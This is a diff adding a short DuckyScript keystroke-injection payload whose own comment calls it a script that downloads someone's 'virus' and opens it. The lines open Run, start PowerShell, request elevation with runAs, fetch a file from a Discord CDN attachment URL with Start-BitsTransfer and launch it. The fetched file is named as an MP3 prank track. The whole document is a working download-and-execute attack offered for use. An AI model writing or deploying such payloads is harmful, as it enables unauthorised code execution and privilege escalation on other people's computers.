@@ -1,0 +1,22 @@
+REM made by Lachlan 
+REM this script downloads @lach's virus and opens it
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING START-PROCESS powershell -Verb runAs
+DELAY 100
+ENTER
+DELAY 500
+STRING cd C:\
+DELAY 1000
+ENTER
+DELAY 1000
+STRING Start-BitsTransfer 'https://cdn.discordapp.com/attachments/1010559428820467713/1068380338046373908/ONTIVA.COM_Lil_Nas_X_Industry_Baby_Gay_Remix_Ft_Fatbub-64k.mp3'
+DELAY 2000
+GUI r 
+STRING C:/[ONTIVA.COM] Lil Nas X Industry Baby (Gay Remix) Ft Fatbub-64k
+ENTER
